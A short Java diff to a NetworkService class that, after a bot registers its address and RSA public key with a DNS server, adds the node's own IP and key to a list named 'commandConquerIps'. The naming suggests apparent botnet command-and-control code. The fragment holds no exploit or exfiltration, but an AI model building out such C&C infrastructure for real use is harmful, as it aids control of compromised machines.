@@ -270,6 +270,8 @@ public class NetworkService {
 			String url = engineBot.getDnsip() + ":" + engineBot.getDnsport();
 			Boolean result = false;
 			result = cecReq.sendInfoToDnsServer(url, this.ip, pki.getPubRSAKey());
+			Pairs<IP, PublicKey> cec = new Pairs<>(getMyIp(),pki.getPubRSAKey());
+			commandConquerIps.add(cec);
 			System.out.println("Ip tornato " + result);
 			return Boolean.TRUE;
 		}else{
